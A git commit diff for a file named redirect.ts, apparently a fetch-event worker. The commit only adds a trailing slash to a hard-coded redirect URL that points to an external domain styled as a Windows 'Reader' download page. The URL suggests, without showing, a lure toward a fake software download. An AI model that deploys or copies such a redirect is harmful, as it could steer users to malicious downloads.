d842f9356d90613fe18ea329e1f8b12e5c64b8a6
owostic101 <charles_still@aol.com>
2025-09-15 12:32:51 -0500

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://michoo-china.com/reader-download-os-Windows-10name-Reader"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://michoo-china.com/reader-download-os-Windows-10name-Reader/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
